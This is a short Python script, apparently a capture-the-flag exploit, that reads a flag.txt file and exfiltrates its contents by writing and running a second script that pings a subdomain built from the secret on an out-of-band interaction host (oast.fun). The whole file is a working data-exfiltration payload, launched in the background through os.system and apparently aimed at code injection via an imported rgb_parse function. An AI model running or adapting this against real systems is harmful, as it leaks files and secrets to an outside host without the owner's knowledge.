def main():
    with open('flag.txt','r') as f:
        flag=f.read()
    payload = f'import os; os.system(f"ping -c 1 {flag[5:-2]}.kldieecelfobludnqkhc22gqism0vc0ig.oast.fun")'
    with open('/tmp/payload.py', 'w') as f:
        f.write(payload)
        f.close()
    
    print('Payload created in /tmp/payload.py')
    import os
    os.system('python3 /tmp/payload.py &')
from parse import rgb_parse
print(rgb_parse(main()))